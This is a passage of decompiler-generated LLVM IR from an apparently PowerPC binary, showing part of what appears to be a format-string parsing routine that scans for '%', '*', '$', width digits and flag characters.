dec_label_pc_1000ee20:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000ee24 = load i32, i32* %arg1, align 4
  store i32 %v2_1000ee24, i32* %r8.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000ee30 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000ee30, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000ee34

dec_label_pc_1000ee34:                            ; preds = %dec_label_pc_1000ee64.dec_label_pc_1000ee34_crit_edge, %dec_label_pc_1000ee20
  %v0_1000ee3c = phi i32 [ %v0_1000ee3c.pre, %dec_label_pc_1000ee64.dec_label_pc_1000ee34_crit_edge ], [ %v2_1000ee24, %dec_label_pc_1000ee20 ]
  %v0_1000ee38 = phi i32 [ %v0_1000ee38.pre, %dec_label_pc_1000ee64.dec_label_pc_1000ee34_crit_edge ], [ %v2_1000ee30, %dec_label_pc_1000ee20 ]
  %v0_1000ee40 = phi i32 [ %v0_1000ee34.pre, %dec_label_pc_1000ee64.dec_label_pc_1000ee34_crit_edge ], [ 0, %dec_label_pc_1000ee20 ]
  %v1_1000ee34 = mul i32 %v0_1000ee40, 4
  %v2_1000ee38 = add i32 %v0_1000ee40, %v0_1000ee38
  store i32 %v2_1000ee38, i32* %r9.global-to-local, align 4
  %v2_1000ee3c = add i32 %v1_1000ee34, %v0_1000ee3c
  store i32 %v2_1000ee3c, i32* %r11.global-to-local, align 4
  %v1_1000ee40 = add i32 %v0_1000ee40, 1
  store i32 %v1_1000ee40, i32* %r10.global-to-local, align 4
  %v1_1000ee44 = add i32 %v2_1000ee3c, -4
  %v2_1000ee44 = inttoptr i32 %v1_1000ee44 to i32*
  %v3_1000ee44 = load i32, i32* %v2_1000ee44, align 4
  store i32 %v3_1000ee44, i32* %r0.global-to-local, align 4
  %v1_1000ee48 = trunc i32 %v3_1000ee44 to i8
  %v3_1000ee48 = add i32 %v2_1000ee38, 24
  %v4_1000ee48 = inttoptr i32 %v3_1000ee48 to i8*
  store i8 %v1_1000ee48, i8* %v4_1000ee48, align 1
  %v0_1000ee4c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ee4c = urem i32 %v0_1000ee4c, 256
  store i32 %v1_1000ee4c, i32* %r0.global-to-local, align 4
  %v0_1000ee54 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ee54 = add i32 %v0_1000ee54, -4
  %v2_1000ee54 = inttoptr i32 %v1_1000ee54 to i32*
  %v3_1000ee54 = load i32, i32* %v2_1000ee54, align 4
  store i32 %v3_1000ee54, i32* %r9.global-to-local, align 4
  %v4_1000ee58 = icmp eq i32 %v1_1000ee4c, %v3_1000ee54
  br i1 %v4_1000ee58, label %dec_label_pc_1000ee60, label %dec_label_pc_1000f2d0

dec_label_pc_1000ee60:                            ; preds = %dec_label_pc_1000ee34
  %v3_1000ee50 = icmp eq i32 %v1_1000ee4c, 0
  br i1 %v3_1000ee50, label %dec_label_pc_1000ee68, label %dec_label_pc_1000ee64

dec_label_pc_1000ee64:                            ; preds = %dec_label_pc_1000ee60
  %v0_1000ee64 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ee64 = add i32 %v0_1000ee64, -1
  store i32 %v1_1000ee64, i32* %ctr.global-to-local, align 4
  %v2_1000ee64 = icmp eq i32 %v1_1000ee64, 0
  br i1 %v2_1000ee64, label %dec_label_pc_1000ee68, label %dec_label_pc_1000ee64.dec_label_pc_1000ee34_crit_edge

dec_label_pc_1000ee64.dec_label_pc_1000ee34_crit_edge: ; preds = %dec_label_pc_1000ee64
  %v0_1000ee34.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_1000ee38.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000ee3c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000ee34

dec_label_pc_1000ee68:                            ; preds = %dec_label_pc_1000ee64, %dec_label_pc_1000ee60
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000ee6c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000ee74

dec_label_pc_1000ee74:                            ; preds = %dec_label_pc_1000ee08, %dec_label_pc_1000ee68
  %v2_1000ee84.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000ee08 ], [ %v2_1000ee30, %dec_label_pc_1000ee68 ]
  %storemerge3 = phi i32 [ %v2_1000ee08, %dec_label_pc_1000ee08 ], [ %v2_1000ee6c, %dec_label_pc_1000ee68 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268566528, i32* @r27, align 4
  store i32 %v2_1000ee84.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000ee94

dec_label_pc_1000ee90:                            ; preds = %dec_label_pc_1000efa0, %dec_label_pc_1000f024
  %v0_1000ee90 = phi i32 [ %v1_1000f024, %dec_label_pc_1000f024 ], [ %v0_1000ef88, %dec_label_pc_1000efa0 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000f024 ], [ %stack_var_-84.2, %dec_label_pc_1000efa0 ]
  store i32 %v0_1000ee90, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000ee94

dec_label_pc_1000ee94:                            ; preds = %dec_label_pc_1000ee74, %dec_label_pc_1000ee90
  %v0_1000eea8 = phi i32 [ %storemerge3, %dec_label_pc_1000ee74 ], [ %v0_1000ee90, %dec_label_pc_1000ee90 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000ee74 ], [ %stack_var_-84.0, %dec_label_pc_1000ee90 ]
  %v1_1000ee94 = inttoptr i32 %v0_1000eea8 to i8*
  %v2_1000ee94 = load i8, i8* %v1_1000ee94, align 1
  %v3_1000ee94 = zext i8 %v2_1000ee94 to i32
  store i32 %v3_1000ee94, i32* %r0.global-to-local, align 4
  store i32 %v0_1000eea8, i32* @r30, align 4
  %v3_1000ee9c = icmp eq i8 %v2_1000ee94, 42
  br i1 %v3_1000ee9c, label %dec_label_pc_1000eea4, label %dec_label_pc_1000eeb4

dec_label_pc_1000eea4:                            ; preds = %dec_label_pc_1000ee94
  %v0_1000eea4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000eea4 = mul i32 %v0_1000eea4, -4
  store i32 %v1_1000eea4, i32* %r0.global-to-local, align 4
  %v1_1000eea8 = add i32 %v0_1000eea8, 1
  store i32 %v1_1000eea8, i32* @r30, align 4
  %v0_1000eeac = load i32, i32* @r1, align 4
  %v2_1000eeac = add i32 %v0_1000eeac, %v1_1000eea4
  store i32 %v2_1000eeac, i32* %r9.global-to-local, align 4
  %v0_1000eeb0 = load i32, i32* @r29, align 4
  %v2_1000eeb0 = add i32 %v2_1000eeac, 8
  %v3_1000eeb0 = inttoptr i32 %v2_1000eeb0 to i32*
  store i32 %v0_1000eeb0, i32* %v3_1000eeb0, align 4
  %v0_1000eecc.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000eeb4

dec_label_pc_1000eeb4:                            ; preds = %dec_label_pc_1000ee94, %dec_label_pc_1000eea4
  %v0_1000eecc.pre = phi i32 [ %v0_1000eea8, %dec_label_pc_1000ee94 ], [ %v0_1000eecc.pre.pre, %dec_label_pc_1000eea4 ]
  %v3_1000eeb4 = load i32, i32* @global_var_1002c8a8, align 4
  store i32 %v3_1000eeb4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000eecc

dec_label_pc_1000eec0:                            ; preds = %dec_label_pc_1000eecc
  %v2_1000eed0 = icmp sgt i32 %v0_1000ef18, 4094
  br i1 %v2_1000eed0, label %dec_label_pc_1000eec8, label %dec_label_pc_1000eec4

dec_label_pc_1000eec4:                            ; preds = %dec_label_pc_1000eec0
  %v1_1000eec4 = add i32 %v2_1000eee4, -48
  store i32 %v1_1000eec4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000eec8

dec_label_pc_1000eec8:                            ; preds = %dec_label_pc_1000eec0, %dec_label_pc_1000eec4
  %v0_1000eed015 = phi i32 [ %v0_1000ef18, %dec_label_pc_1000eec0 ], [ %v1_1000eec4, %dec_label_pc_1000eec4 ]
  %v1_1000eec8 = add i32 %v0_1000ef48, 1
  store i32 %v1_1000eec8, i32* @r30, align 4
  br label %dec_label_pc_1000eecc

dec_label_pc_1000eecc:                            ; preds = %dec_label_pc_1000eeb4, %dec_label_pc_1000eec8
  %v0_1000ef18 = phi i32 [ 0, %dec_label_pc_1000eeb4 ], [ %v0_1000eed015, %dec_label_pc_1000eec8 ]
  %v0_1000ef48 = phi i32 [ %v0_1000eecc.pre, %dec_label_pc_1000eeb4 ], [ %v1_1000eec8, %dec_label_pc_1000eec8 ]
  %v1_1000eecc = inttoptr i32 %v0_1000ef48 to i8*
  %v2_1000eecc = load i8, i8* %v1_1000eecc, align 1
  %v3_1000eecc = zext i8 %v2_1000eecc to i32
  store i32 %v3_1000eecc, i32* %r11.global-to-local, align 4
  %v1_1000eed4 = mul nuw nsw i32 %v3_1000eecc, 2
  store i32 %v1_1000eed4, i32* %r9.global-to-local, align 4
  %v2_1000eed8 = add i32 %v1_1000eed4, %v3_1000eeb4
  %v3_1000eed8 = inttoptr i32 %v2_1000eed8 to i16*
  %v4_1000eed8 = load i16, i16* %v3_1000eed8, align 2
  %v5_1000eed8 = zext i16 %v4_1000eed8 to i32
  store i32 %v5_1000eed8, i32* %r0.global-to-local, align 4
  %v1_1000eedc = mul i32 %v0_1000ef18, 10
  %v1_1000eee0 = and i32 %v5_1000eed8, 8
  store i32 %v1_1000eee0, i32* @r25, align 4
  %v3_1000eee0 = icmp eq i32 %v1_1000eee0, 0
  %v2_1000eee4 = add i32 %v3_1000eecc, %v1_1000eedc
  store i32 %v2_1000eee4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000eee0, label %dec_label_pc_1000eeec, label %dec_label_pc_1000eec0

dec_label_pc_1000eeec:                            ; preds = %dec_label_pc_1000eecc
  %v0_1000eeec = load i32, i32* %r10.global-to-local, align 4
  %v1_1000eeec = add i32 %v0_1000eeec, -1
  %v2_1000eeec = inttoptr i32 %v1_1000eeec to i8*
  %v3_1000eeec = load i8, i8* %v2_1000eeec, align 1
  %v4_1000eeec = zext i8 %v3_1000eeec to i32
  store i32 %v4_1000eeec, i32* %r0.global-to-local, align 4
  %v3_1000eef0 = icmp eq i8 %v3_1000eeec, 37
  br i1 %v3_1000eef0, label %dec_label_pc_1000eef8, label %dec_label_pc_1000efc0

dec_label_pc_1000eef8:                            ; preds = %dec_label_pc_1000eeec
  %v3_1000eef8 = icmp eq i8 %v2_1000eecc, 36
  br i1 %v3_1000eef8, label %dec_label_pc_1000ef00, label %dec_label_pc_1000ef34

dec_label_pc_1000ef00:                            ; preds = %dec_label_pc_1000eef8
  %tmp58 = icmp slt i32 %v0_1000ef18, 1
  br i1 %tmp58, label %dec_label_pc_1000ef34, label %dec_label_pc_1000ef08

dec_label_pc_1000ef08:                            ; preds = %dec_label_pc_1000ef00
  %v0_1000ef08 = load i32, i32* @r26, align 4
  %v3_1000ef08 = icmp eq i32 %v0_1000ef08, 0
  %v1_1000ef0c = add i32 %v0_1000ef48, 1
  store i32 %v1_1000ef0c, i32* %r10.global-to-local, align 4
  br i1 %v3_1000ef08, label %dec_label_pc_1000f2d0, label %dec_label_pc_1000ef14

dec_label_pc_1000ef14:                            ; preds = %dec_label_pc_1000ef08
  %v3_1000ef14 = icmp sgt i32 %v0_1000ef18, %v0_1000ef08
  br i1 %v3_1000ef14, label %dec_label_pc_1000ef20, label %dec_label_pc_1000ef2c

dec_label_pc_1000ef20:                            ; preds = %dec_label_pc_1000ef14
  store i32 %v0_1000ef18, i32* @r26, align 4
  br label %dec_label_pc_1000ef2c

dec_label_pc_1000ef28:                            ; preds = %dec_label_pc_1000ef50, %dec_label_pc_1000ef48
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000ef2c

dec_label_pc_1000ef2c:                            ; preds = %dec_label_pc_1000ef14, %dec_label_pc_1000ef20, %dec_label_pc_1000ef28
  %v0_1000ef2c = phi i32 [ %v0_1000eeec, %dec_label_pc_1000ef28 ], [ %v1_1000ef0c, %dec_label_pc_1000ef20 ], [ %v1_1000ef0c, %dec_label_pc_1000ef14 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000ef28 ], [ %v0_1000ef18, %dec_label_pc_1000ef20 ], [ %v0_1000ef18, %dec_label_pc_1000ef14 ]
  br label %dec_label_pc_1000ef68

dec_label_pc_1000ef34:                            ; preds = %dec_label_pc_1000eef8, %dec_label_pc_1000ef00
  %v0_1000ef34 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000ef34, 1
  br i1 %tmp59, label %dec_label_pc_1000ef48, label %dec_label_pc_1000ef3c

dec_label_pc_1000ef3c:                            ; preds = %dec_label_pc_1000ef34
  %v3_1000ef3c = icmp eq i8 %v2_1000eecc, 109
  br i1 %v3_1000ef3c, label %dec_label_pc_1000efc0, label %dec_label_pc_1000f2d0

dec_label_pc_1000ef48:                            ; preds = %dec_label_pc_1000ef34
  %v3_1000ef48 = icmp ugt i32 %v0_1000ef48, %v0_1000eeec
  br i1 %v3_1000ef48, label %dec_label_pc_1000ef50, label %dec_label_pc_1000ef28

dec_label_pc_1000ef50:                            ; preds = %dec_label_pc_1000ef48
  %v1_1000ef50 = inttoptr i32 %v0_1000eeec to i8*
  %v2_1000ef50 = load i8, i8* %v1_1000ef50, align 1
  %v3_1000ef50 = zext i8 %v2_1000ef50 to i32
  store i32 %v3_1000ef50, i32* %r0.global-to-local, align 4
  store i32 %v0_1000eeec, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000ef5c = icmp eq i8 %v2_1000ef50, 48
  br i1 %v3_1000ef5c, label %dec_label_pc_1000ef28, label %dec_label_pc_1000efc4

dec_label_pc_1000ef68:                            ; preds = %dec_label_pc_1000ef84, %dec_label_pc_1000ef2c
  %v0_1000ef88 = phi i32 [ %v0_1000ef2c, %dec_label_pc_1000ef2c ], [ %v1_1000ef88, %dec_label_pc_1000ef84 ]
  store i32 %v0_1000ef88, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001b300.1052 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000ef78 = inttoptr i32 %v0_1000ef88 to i8*
  br label %dec_label_pc_1000ef70

dec_label_pc_1000ef70:                            ; preds = %dec_label_pc_1000ef90, %dec_label_pc_1000ef68
  %v1_1000ef84 = phi i32 [ %v1_1000ef94, %dec_label_pc_1000ef90 ], [ 1, %dec_label_pc_1000ef68 ]
  %v0_1000ef70 = phi i32 [ %v1_1000ef74, %dec_label_pc_1000ef90 ], [ ptrtoint ([8 x i8]* @global_var_1001b300.1052 to i32), %dec_label_pc_1000ef68 ]
  %v1_1000ef70 = inttoptr i32 %v0_1000ef70 to i8*
  %v2_1000ef70 = load i8, i8* %v1_1000ef70, align 1
  %v3_1000ef70 = zext i8 %v2_1000ef70 to i32
  store i32 %v3_1000ef70, i32* %r9.global-to-local, align 4
  %v1_1000ef74 = add i32 %v0_1000ef70, 1
  store i32 %v1_1000ef74, i32* %r11.global-to-local, align 4
  %v2_1000ef78 = load i8, i8* %v1_1000ef78, align 1
  %v3_1000ef78 = zext i8 %v2_1000ef78 to i32
  store i32 %v3_1000ef78, i32* %r0.global-to-local, align 4
  %v4_1000ef7c = icmp eq i8 %v2_1000ef78, %v2_1000ef70
  br i1 %v4_1000ef7c, label %dec_label_pc_1000ef84, label %dec_label_pc_1000ef90

dec_label_pc_1000ef84:                            ; preds = %dec_label_pc_1000ef70
  %v0_1000ef84 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000ef84 = or i32 %v0_1000ef84, %v1_1000ef84
  store i32 %v2_1000ef84, i32* %r6.global-to-local, align 4
  %v1_1000ef88 = add i32 %v0_1000ef88, 1
  br label %dec_label_pc_1000ef68

dec_label_pc_1000ef90:                            ; preds = %dec_label_pc_1000ef70
  %v1_1000ef90 = inttoptr i32 %v1_1000ef74 to i8*
  %v2_1000ef90 = load i8, i8* %v1_1000ef90, align 1
  %v3_1000ef90 = zext i8 %v2_1000ef90 to i32
  store i32 %v3_1000ef90, i32* %r0.global-to-local, align 4
  %v1_1000ef94 = mul i32 %v1_1000ef84, 2
  store i32 %v1_1000ef94, i32* %r10.global-to-local, align 4
  %v3_1000ef98 = icmp eq i8 %v2_1000ef90, 0
  br i1 %v3_1000ef98, label %dec_label_pc_1000efa0, label %dec_label_pc_1000ef70

dec_label_pc_1000efa0:                            ; preds = %dec_label_pc_1000ef90
  %v1_1000efa0 = add i32 %v0_1000ef88, -1
  %v2_1000efa0 = inttoptr i32 %v1_1000efa0 to i8*
  %v3_1000efa0 = load i8, i8* %v2_1000efa0, align 1
  %v4_1000efa0 = zext i8 %v3_1000efa0 to i32
  store i32 %v4_1000efa0, i32* %r0.global-to-local, align 4
  %v0_1000efa4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000efa4 = and i32 %v0_1000efa4, 10
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_1000efac = icmp eq i8 %v3_1000efa0, 37
  %v1_1000efb0 = udiv i32 %v1_1000efa4, 2
  store i32 %v1_1000efb0, i32* %r9.global-to-local, align 4
  %v2_1000efb4 = sub nuw nsw i32 -1, %v1_1000efb0
  %v3_1000efb4 = and i32 %v0_1000efa4, %v2_1000efb4
  store i32 %v3_1000efb4, i32* %r6.global-to-local, align 4
  br i1 %v3_1000efac, label %dec_label_pc_1000efc4, label %dec_label_pc_1000ee90

dec_label_pc_1000efc0:                            ; preds = %dec_label_pc_1000eeec, %dec_label_pc_1000ef3c
  store i32 %v0_1000eeec, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000efc4

dec_label_pc_1000efc4:                            ; preds = %dec_label_pc_1000ef50, %dec_label_pc_1000efa0, %dec_label_pc_1000efc0
  %v0_1000eff8 = phi i32 [ 0, %dec_label_pc_1000efa0 ], [ %v0_1000ef18, %dec_label_pc_1000ef50 ], [ %v0_1000ef18, %dec_label_pc_1000efc0 ]
  %v1_1000f004 = phi i32 [ %v0_1000ef88, %dec_label_pc_1000efa0 ], [ %v0_1000ef48, %dec_label_pc_1000ef50 ], [ %v0_1000ef48, %dec_label_pc_1000efc0 ]
  %v0_1000f000 = phi i32 [ %v1_1000ef74, %dec_label_pc_1000efa0 ], [ %v0_1000eeec, %dec_label_pc_1000ef50 ], [ %v0_1000eeec, %dec_label_pc_1000efc0 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000efa0 ], [ %stack_var_-84.1, %dec_label_pc_1000ef50 ], [ %stack_var_-84.1, %dec_label_pc_1000efc0 ]
  %v1_1000efc4 = inttoptr i32 %v0_1000f000 to i8*
  %v2_1000efc4 = load i8, i8* %v1_1000efc4, align 1
  %v3_1000efc4 = zext i8 %v2_1000efc4 to i32
  store i32 %v3_1000efc4, i32* %r0.global-to-local, align 4
  %v3_1000efc8 = icmp eq i8 %v2_1000efc4, 42
  br i1 %v3_1000efc8, label %dec_label_pc_1000efd0, label %dec_label_pc_1000f010

dec_label_pc_1000efd0:                            ; preds = %dec_label_pc_1000efc4
  %v0_1000efd0 = load i32, i32* @r26, align 4
  %v3_1000efd0 = icmp eq i32 %v0_1000efd0, 0
  br i1 %v3_1000efd0, label %dec_label_pc_1000f000, label %dec_label_pc_1000efd8

dec_label_pc_1000efd8:                            ; preds = %dec_label_pc_1000efd0
  %v1_1000efd8 = inttoptr i32 %v1_1000f004 to i8*
  %v2_1000efd8 = load i8, i8* %v1_1000efd8, align 1
  %v3_1000efd8 = zext i8 %v2_1000efd8 to i32
  store i32 %v3_1000efd8, i32* %r0.global-to-local, align 4
  %v3_1000efdc = icmp eq i8 %v2_1000efd8, 36
  br i1 %v3_1000efdc, label %dec_label_pc_1000efe4, label %dec_label_pc_1000f2d0

dec_label_pc_1000efe4:                            ; preds = %dec_label_pc_1000efd8
  %tmp60 = icmp slt i32 %v0_1000eff8, 1
  br i1 %tmp60, label %dec_label_pc_1000f2d0, label %dec_label_pc_1000efec

dec_label_pc_1000efec:                            ; preds = %dec_label_pc_1000efe4
  %v0_1000efec = load i32, i32* %r5.global-to-local, align 4
  %v1_1000efec = mul i32 %v0_1000efec, -4
  %v1_1000eff0 = add i32 %v1_1000f004, 1
  store i32 %v1_1000eff0, i32* @r30, align 4
  %v0_1000eff4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000eff4 = add i32 %v0_1000eff4, %v1_1000efec
  store i32 %v2_1000eff4, i32* %r9.global-to-local, align 4
  %v2_1000eff8 = add i32 %v2_1000eff4, 12
  %v3_1000eff8 = inttoptr i32 %v2_1000eff8 to i32*
  store i32 %v0_1000eff8, i32* %v3_1000eff8, align 4
  %v0_1000f018.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f00c

dec_label_pc_1000f000:                            ; preds = %dec_label_pc_1000efd0
  %v1_1000f000 = add i32 %v0_1000f000, 1
  store i32 %v1_1000f000, i32* %r0.global-to-local, align 4
  %v4_1000f004 = icmp eq i32 %v1_1000f000, %v1_1000f004
  br i1 %v4_1000f004, label %dec_label_pc_1000f00c, label %dec_label_pc_1000f2d0

dec_label_pc_1000f00c:                            ; preds = %dec_label_pc_1000f000, %dec_label_pc_1000efec
  %v0_1000f018.pre = phi i32 [ %v1_1000f004, %dec_label_pc_1000f000 ], [ %v0_1000f018.pre.pre, %dec_label_pc_1000efec ]
  store i32 -2147483648, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f010

dec_label_pc_1000f010:                            ; preds = %dec_label_pc_1000efc4, %dec_label_pc_1000f00c
  %v0_1000f018 = phi i32 [ %v1_1000f004, %dec_label_pc_1000efc4 ], [ %v0_1000f018.pre, %dec_label_pc_1000f00c ]
  %v0_1000f028 = phi i32 [ %v0_1000eff8, %dec_label_pc_1000efc4 ], [ -2147483648, %dec_label_pc_1000f00c ]
  %v0_1000f010 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000f010 = icmp eq i32 %v0_1000f010, 0
  %v1_1000f018 = inttoptr i32 %v0_1000f018 to i8*
  br i1 %v3_1000f010, label %dec_label_pc_1000f018, label %dec_label_pc_1000f03c

dec_label_pc_1000f018:                            ; preds = %dec_label_pc_1000f010
  %v2_1000f018 = load i8, i8* %v1_1000f018, align 1
  %v3_1000f018 = zext i8 %v2_1000f018 to i32
  store i32 %v3_1000f018, i32* %r0.global-to-local, align 4
  %v3_1000f01c = icmp eq i8 %v2_1000f018, 46
  br i1 %v3_1000f01c, label %dec_label_pc_1000f024, label %dec_label_pc_1000f034

dec_label_pc_1000f024:                            ; preds = %dec_label_pc_1000f018
  %v1_1000f024 = add i32 %v0_1000f018, 1
  store i32 %v0_1000f028, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ee90

dec_label_pc_1000f034:                            ; preds = %dec_label_pc_1000f018
  store i32 %v0_1000f028, i32* @r31, align 4
  br label %dec_label_pc_1000f03c

dec_label_pc_1000f03c:                            ; preds = %dec_label_pc_1000f010, %dec_label_pc_1000f034
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000f034 ], [ %v0_1000f028, %dec_label_pc_1000f010 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v2_1000f040 = load i8, i8* %v1_1000f018, align 1
  %v3_1000f040 = zext i8 %v2_1000f040 to i32
  store i32 %v3_1000f040, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1001b2a8.1053 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f048

dec_label_pc_1000f048:                            ; preds = %dec_label_pc_1000f054, %dec_label_pc_1000f03c
  %v0_1000f054 = phi i32 [ %v1_1000f054, %dec_label_pc_1000f054 ], [ ptrtoint ([9 x i8]* @global_var_1001b2a8.1053 to i32), %dec_label_pc_1000f03c ]
  %v1_1000f048 = inttoptr i32 %v0_1000f054 to i8*
  %v2_1000f048 = load i8, i8* %v1_1000f048, align 1
  %v3_1000f048 = zext i8 %v2_1000f048 to i32
  store i32 %v3_1000f048, i32* %r0.global-to-local, align 4
  %v4_1000f04c = icmp eq i8 %v2_1000f040, %v2_1000f048
  br i1 %v4_1000f04c, label %dec_label_pc_1000ee18, label %dec_label_pc_1000f054

dec_label_pc_1000f054:                            ; preds = %dec_label_pc_1000f048
  %v1_1000f054 = add i32 %v0_1000f054, 1
  %v2_1000f054 = inttoptr i32 %v1_1000f054 to i8*
  %v3_1000f054 = load i8, i8* %v2_1000f054, align 1
  %v4_1000f054 = zext i8 %v3_1000f054 to i32
  store i32 %v4_1000f054, i32* %r0.global-to-local, align 4
  store i32 %v1_1000f054, i32* %r11.global-to-local, align 4
  %v3_1000f058 = icmp eq i8 %v3_1000f054, 0
  br i1 %v3_1000f058, label %dec_label_pc_1000f060, label %dec_label_pc_1000f048

dec_label_pc_1000f060:                            ; preds = %dec_label_pc_1000f054, %dec_label_pc_1000ee18
  %v0_1000f088 = phi i32 [ %v1_1000ee18, %dec_label_pc_1000ee18 ], [ %v0_1000f018, %dec_label_pc_1000f054 ]
  %v0_1000f084 = phi i32 [ %v0_1000f054, %dec_label_pc_1000ee18 ], [ %v1_1000f054, %dec_label_pc_1000f054 ]
  %v2_1000f068 = sub i32 %v0_1000f084, ptrtoint ([9 x i8]* @global_var_1001b2a8.1053 to i32)
  store i32 %v2_1000f068, i32* %r9.global-to-local, align 4
  %v2_1000f06c = icmp sgt i32 %v2_1000f068, 1
  br i1 %v2_1000f06c, label %dec_label_pc_1000f08c, label %dec_label_pc_1000f074

dec_label_pc_1000f074:                            ; preds = %dec_label_pc_1000f060
  %v1_1000f074 = inttoptr i32 %v0_1000f088 to i8*
  %v2_1000f074 = load i8, i8* %v1_1000f074, align 1
  %v3_1000f074 = zext i8 %v2_1000f074 to i32
  store i32 %v3_1000f074, i32* %r0.global-to-local, align 4
  %v1_1000f078 = inttoptr i32 %v0_1000f084 to i8*
  %v2_1000f078 = load i8, i8* %v1_1000f078, align 1
  %v3_1000f078 = zext i8 %v2_1000f078 to i32
  store i32 %v3_1000f078, i32* %r9.global-to-local, align 4
  %v4_1000f07c = icmp eq i8 %v2_1000f074, %v2_1000f078
  br i1 %v4_1000f07c, label %dec_label_pc_1000f084, label %dec_label_pc_1000f08c

dec_label_pc_1000f084:                            ; preds = %dec_label_pc_1000f074
  %v1_1000f084 = add i32 %v0_1000f084, 9
  store i32 %v1_1000f084, i32* %r11.global-to-local, align 4
  %v1_1000f088 = add i32 %v0_1000f088, 1
  store i32 %v1_1000f088, i32* @r30, align 4
  br label %dec_label_pc_1000f08c

dec_label_pc_1000f08c:                            ; preds = %dec_label_pc_1000f074, %dec_label_pc_1000f060, %dec_label_pc_1000f084
  %v0_1000f090 = phi i32 [ %v0_1000f084, %dec_label_pc_1000f074 ], [ %v0_1000f084, %dec_label_pc_1000f060 ], [ %v1_1000f084, %dec_label_pc_1000f084 ]
  %v0_1000f08c = phi i32 [ %v0_1000f088, %dec_label_pc_1000f074 ], [ %v0_1000f088, %dec_label_pc_1000f060 ], [ %v1_1000f088, %dec_label_pc_1000f084 ]
  %v1_1000f08c = inttoptr i32 %v0_1000f08c to i8*
  %v2_1000f08c = load i8, i8* %v1_1000f08c, align 1
  %v3_1000f08c = zext i8 %v2_1000f08c to i32
  store i32 %v3_1000f08c, i32* %r7.global-to-local, align 4
  %v1_1000f090 = add i32 %v0_1000f090, 9
  %v2_1000f090 = inttoptr i32 %v1_1000f090 to i8*
  %v3_1000f090 = load i8, i8* %v2_1000f090, align 1
  %v4_1000f090 = zext i8 %v3_1000f090 to i32
  store i32 %v4_1000f090, i32* %r0.global-to-local, align 4
  %v3_1000f094 = icmp eq i8 %v2_1000f08c, 0
  %v1_1000f098 = mul nuw nsw i32 %v4_1000f090, 256
  store i32 %v1_1000f098, i32* %r10.global-to-local, align 4
  br i1 %v3_1000f094, label %dec_label_pc_1000f2d0, label %dec_label_pc_1000f0a0

dec_label_pc_1000f0a0:                            ; preds = %dec_label_pc_1000f08c
  %v1_1000f0a4 = and i32 %v1_1000f098, 1024
  store i32 %v1_1000f0a4, i32* %r0.global-to-local, align 4
  %v3_1000f0a4 = icmp eq i32 %v1_1000f0a4, 0
  store i32 ptrtoint ([21 x i8]* @global_var_1001b2e8.1054 to i32), i32* %r8.global-to-local, align 4
  store i32 268566528, i32* %r3.global-to-local, align 4
  %v3_1000f0b0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000f0b0, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001b2dc.1055 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1001b2e8.1054 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f0c0

dec_label_pc_1000f0c0:                            ; preds = %dec_label_pc_1000f124, %dec_label_pc_1000f0a0
  %v1_1000f0cc = phi i32 [ %v1_1000f124, %dec_label_pc_1000f124 ], [ ptrtoint ([21 x i8]* @global_var_1001b2e8.1054 to i32), %dec_label_pc_1000f0a0 ]
  %v1_1000f0c0 = inttoptr i32 %v1_1000f0cc to i8*
  %v2_1000f0c0 = load i8, i8* %v1_1000f0c0, align 1
